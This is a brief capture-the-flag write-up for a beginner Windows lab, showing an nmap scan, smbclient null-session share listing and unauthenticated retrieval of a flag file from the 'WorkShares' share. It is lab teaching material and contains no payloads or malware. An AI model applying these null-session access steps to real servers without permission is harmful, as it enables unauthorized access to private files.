# Dancing — Very Easy (Windows)

**Category:** SMB
**Summary:** Introduces SMB enumeration and exploitation when shares are accessible without authentication.

## Recon
```
nmap -sV -sC <target-ip>

PORT     STATE SERVICE       VERSION
445/tcp  open  microsoft-ds
```

## Enumeration
```
smbclient -L <target-ip> -N
```
Listing shares with a null session (`-N`, no password) revealed multiple shares, including one named `WorkShares` that didn't require authentication to browse.

## Exploitation
- Share with flag: `WorkShares`
- Access: `smbclient \\<target-ip>\WorkShares -N`
- Retrieve file: `get flag.txt`

## Flag
Captured the flag from `flag.txt` inside the `WorkShares` share (not reproducing the flag value here).

## Lessons learned
- A null/guest SMB session was enough to list *and* access a share — no credentials needed at all.
- Worth always trying `-N` on `smbclient` before assuming a target requires creds.
